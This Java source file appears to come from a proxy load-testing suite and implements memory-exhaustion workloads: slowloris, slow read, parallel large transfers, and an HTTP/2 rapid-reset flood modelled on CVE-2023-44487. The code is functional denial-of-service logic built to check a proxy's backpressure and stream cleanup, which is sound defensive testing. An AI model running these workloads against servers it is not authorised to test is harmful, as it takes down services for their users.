package org.microproxy.loadtest.client;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import io.github.mahmoudimus.http2.ErrorCode;
import io.github.mahmoudimus.http2.FrameWriter;
import io.github.mahmoudimus.http2.HeaderField;
import io.github.mahmoudimus.http2.HpackEncoder;
import org.microproxy.loadtest.Json;

/**
 * The client side of the adversarial memory scenario: workloads meant to make a forward proxy
 * buffer without bound if it does not apply backpressure or cap its per-connection state. Each one
 * runs for a set time against the proxy, and the scenario watches the proxy's memory the whole
 * time; the load generator holds nothing large itself, so growth is the proxy's.
 *
 * <ul>
 *   <li><b>slowloris:</b> many connections that send a request line and then one header line every
 *       few seconds, never finishing the head, holding a request parser open on each;
 *   <li><b>slowread:</b> connections that ask for a large response and read it a few kilobytes a
 *       second, so the proxy must either hold the whole body or stop reading from the origin;
 *   <li><b>updown:</b> large uploads and large downloads in parallel;
 *   <li><b>rapidreset:</b> over h2c, bursts of HEADERS immediately followed by RST_STREAM (the
 *       CVE-2023-44487 shape), to see whether cancelled streams are cleaned up.
 * </ul>
 *
 * <p>Stopping a workload closes its sockets, so a thread blocked writing to a proxy that has
 * stopped reading unblocks at once and the orchestrator never waits on it.
 */
public final class MemoryWorkloads {

    private MemoryWorkloads() {}

    /** A running workload: started, polled for progress, then stopped. */
    public interface Handle {
        /** The counters so far. */
        Map<String, Object> progress();

        /** Stops the workload and returns the final counters. */
        Map<String, Object> stop();
    }

    /** A workload that tracks its threads and sockets so {@link #stop()} can unblock them. */
    private abstract static class Base implements Handle {
        final AtomicBoolean stop = new AtomicBoolean();
        final CopyOnWriteArrayList<Thread> threads = new CopyOnWriteArrayList<>();
        final CopyOnWriteArrayList<Socket> sockets = new CopyOnWriteArrayList<>();

        Socket track(Socket s) {
            sockets.add(s);
            return s;
        }

        /** Stops tracking a socket a reconnecting worker has finished with, so the list stays bounded. */
        void untrack(Socket s) {
            sockets.remove(s);
        }

        void run(int count, Runnable worker) {
            for (int i = 0; i < count; i++) threads.add(Thread.ofVirtual().start(worker));
        }

        @Override
        public Map<String, Object> stop() {
            stop.set(true);
            for (Socket s : sockets) {
                try {
                    s.close();
                } catch (IOException e) {
                    // Already closed.
                }
            }
            // One shared deadline, so a few stragglers cannot add up to a long wait.
            long deadline = System.nanoTime() + 15_000_000_000L;
            for (Thread t : threads) {
                long left = (deadline - System.nanoTime()) / 1_000_000;
                if (left <= 0) break;
                try {
                    t.join(left);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            return progress();
        }
    }

    /** Starts the workload named {@code name} from {@code cmd}'s parameters. */
    public static Handle start(InetSocketAddress proxy, Map<String, Object> cmd) {
        String name = Json.getString(cmd, "attack", "");
        return switch (name) {
            case "slowloris" -> slowloris(proxy, (int) Json.getLong(cmd, "connections", 100),
                    (int) Json.getLong(cmd, "intervalMs", 1000));
            case "slowread" -> slowread(proxy, (int) Json.getLong(cmd, "connections", 20), Json.getString(cmd, "url", ""),
                    Json.getLong(cmd, "rate", 8192));
            case "updown" -> updown(proxy, (int) Json.getLong(cmd, "connections", 2), Json.getString(cmd, "downUrl", ""),
                    Json.getString(cmd, "upUrl", ""), Json.getLong(cmd, "bytes", 1 << 23));
            case "rapidreset" -> rapidReset(proxy, (int) Json.getLong(cmd, "connections", 2),
                    Json.getString(cmd, "authority", ""), Json.getString(cmd, "path", "/bytes/1024"));
            default -> throw new IllegalArgumentException("unknown workload " + name);
        };
    }

    private static Handle slowloris(InetSocketAddress proxy, int connections, int intervalMs) {
        AtomicLong active = new AtomicLong();
        AtomicLong headersSent = new AtomicLong();
        Base h = new Base() {
            @Override
            public Map<String, Object> progress() {
                return Json.obj("connectionsActive", active.get(), "headerLinesSent", headersSent.get());
            }
        };
        h.run(connections, () -> {
            Socket s = null;
            try {
                s = h.track(new Socket());
                s.connect(proxy, 5000);
                s.setTcpNoDelay(true);
                OutputStream out = s.getOutputStream();
                out.write(("GET http://127.0.0.1:1/slowloris HTTP/1.1\r\nHost: 127.0.0.1:1\r\n")
                        .getBytes(StandardCharsets.US_ASCII));
                out.flush();
                active.incrementAndGet();
                while (!h.stop.get()) {
                    Thread.sleep(intervalMs);
                    if (h.stop.get()) break;
                    out.write(("X-Pad-" + headersSent.incrementAndGet() + ": keep-waiting\r\n").getBytes(StandardCharsets.US_ASCII));
                    out.flush();
                }
            } catch (IOException | InterruptedException e) {
                // Refused, closed by the proxy (it capped the header size or timed out), or stopped.
            } finally {
                active.decrementAndGet();
                closeQuietly(s);
            }
        });
        return h;
    }

    private static Handle slowread(InetSocketAddress proxy, int connections, String url, long rate) {
        AtomicLong active = new AtomicLong();
        AtomicLong bytesRead = new AtomicLong();
        Base h = new Base() {
            @Override
            public Map<String, Object> progress() {
                return Json.obj("connectionsActive", active.get(), "bytesRead", bytesRead.get());
            }
        };
        HttpConn.Target t = HttpConn.Target.of(url, 200, -1, 0);
        h.run(connections, () -> {
            while (!h.stop.get()) {
                // A small receive buffer makes the proxy feel the slow reader through TCP backpressure.
                Socket sock = null;
                try (HttpConn c = HttpConn.open(proxy, null, 5000, 600_000, 8192)) {
                    sock = h.track(c.socket());
                    active.incrementAndGet();
                    HttpConn.Result r = c.exchange(t, rate, System.nanoTime() + 3_600_000_000_000L);
                    bytesRead.addAndGet(r.bodyBytes());
                } catch (IOException e) {
                    // Reconnect.
                } finally {
                    active.decrementAndGet();
                    if (sock != null) h.untrack(sock);
                }
                sleepUnlessStopped(h, 50);
            }
        });
        return h;
    }

    private static Handle updown(InetSocketAddress proxy, int connections, String downUrl, String upUrl, long bytes) {
        AtomicLong uploads = new AtomicLong();
        AtomicLong downloads = new AtomicLong();
        Base h = new Base() {
            @Override
            public Map<String, Object> progress() {
                return Json.obj("uploads", uploads.get(), "downloads", downloads.get());
            }
        };
        HttpConn.Target down = HttpConn.Target.of(downUrl, 200, bytes, 0);
        HttpConn.Target up = HttpConn.Target.of(upUrl, 200, -1, bytes);
        h.run(connections, () -> loop(h, proxy, down, downloads));
        h.run(connections, () -> loop(h, proxy, up, uploads));
        return h;
    }

    private static void loop(Base h, InetSocketAddress proxy, HttpConn.Target t, AtomicLong count) {
        while (!h.stop.get()) {
            Socket sock = null;
            try (HttpConn c = HttpConn.open(proxy, null, 5000, 120_000, 0)) {
                sock = h.track(c.socket());
                HttpConn.Result r = c.exchange(t);
                if (r.outcome() == Outcome.OK) count.incrementAndGet();
            } catch (IOException e) {
                sleepUnlessStopped(h, 50);
            } finally {
                if (sock != null) h.untrack(sock);
            }
        }
    }

    /**
     * The rapid-reset shape over h2c: the connection preface and SETTINGS, then a burst of HEADERS
     * immediately cancelled with RST_STREAM, over and over. A proxy that cleans up a cancelled
     * stream stays flat; one that does not grows.
     */
    private static Handle rapidReset(InetSocketAddress proxy, int connections, String authority, String path) {
        AtomicLong streams = new AtomicLong();
        AtomicLong active = new AtomicLong();
        Base h = new Base() {
            @Override
            public Map<String, Object> progress() {
                return Json.obj("connectionsActive", active.get(), "streamsSent", streams.get());
            }
        };
        h.run(connections, () -> {
            while (!h.stop.get()) {
                Socket s = h.track(new Socket());
                try {
                    s.connect(proxy, 5000);
                    s.setTcpNoDelay(true);
                    active.incrementAndGet();
                    OutputStream out = s.getOutputStream();
                    InputStream in = s.getInputStream();
                    FrameWriter writer = new FrameWriter(out);
                    writer.writeClientPreface();
                    writer.writeSettings(Map.of(0x3, 0L)); // MAX_CONCURRENT_STREAMS 0 from us.
                    writer.flush();
                    HpackEncoder hpack = new HpackEncoder();
                    Thread.ofVirtual().start(() -> drain(in));
                    int streamId = 1;
                    while (!h.stop.get() && streamId < 1_000_000) {
                        byte[] block = hpack.encode(List.of(new HeaderField(":method", "GET"),
                                new HeaderField(":scheme", "http"), new HeaderField(":authority", authority),
                                new HeaderField(":path", path)));
                        writer.writeHeaders(streamId, block, true);
                        writer.writeRstStream(streamId, ErrorCode.CANCEL);
                        streams.incrementAndGet();
                        streamId += 2;
                        if (streamId % 200 == 1) {
                            writer.flush();
                            Thread.sleep(1);
                        }
                    }
                    writer.flush();
                } catch (IOException e) {
                    // The proxy closed the connection (it limited reset streams): reconnect.
                } catch (InterruptedException e) {
                    return;
                } finally {
                    active.decrementAndGet();
                    closeQuietly(s);
                    h.untrack(s);
                }
                sleepUnlessStopped(h, 50);
            }
        });
        return h;
    }

    private static void drain(InputStream in) {
        byte[] buf = new byte[16 * 1024];
        try {
            while (in.read(buf) >= 0) {
                // Discard the proxy's SETTINGS, GOAWAY and any response frames.
            }
        } catch (IOException e) {
            // Closed.
        }
    }

    private static void sleepUnlessStopped(Base h, long ms) {
        if (h.stop.get()) return;
        try {
            Thread.sleep(ms);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private static void closeQuietly(Socket s) {
        if (s == null) return;
        try {
            s.close();
        } catch (IOException e) {
            // Already closed.
        }
    }
}
